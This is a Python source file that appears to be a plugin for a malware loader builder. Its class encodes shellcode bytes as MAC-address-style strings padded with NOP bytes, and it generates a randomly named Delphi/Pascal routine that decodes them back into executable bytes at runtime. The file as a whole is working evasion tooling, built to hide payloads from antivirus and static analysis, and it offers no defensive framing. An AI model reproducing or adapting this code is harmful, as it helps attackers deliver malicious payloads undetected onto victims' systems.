import random
import string

class MACObfuscate:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.size = 0
        self.decodedLength = len(decoded)
        for i in range(0, len(decoded), 6):
            chunk = decoded[i:i+6]
            if len(chunk) < 6:
                chunk = chunk + (b"\x90" * (6 - len(chunk)))
            encoded.append('-'.join([ f'{chunk[n]:02x}' for n in range(0, 6)]))
            self.size += 1
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
function {self.name}(encoded: TStringArray): TBytes;
var
    i: Integer;
    address: String;
    addrBytes: TStringArray;
    decoded: TBytes;
    j: Integer;
begin

    SetLength(decoded, {self.size*6});
    for i:= Low(encoded) To High(encoded) do
    begin
        address := encoded[i];
        addrBytes := address.Split(['-']);
        for j := Low(addrBytes) To High(addrBytes) do
        begin
            decoded[i*6+j] := StrToInt('$' + addrBytes[j]);
        end;
    end;
    Result := Copy(decoded, 0, {self.decodedLength});
end;
"""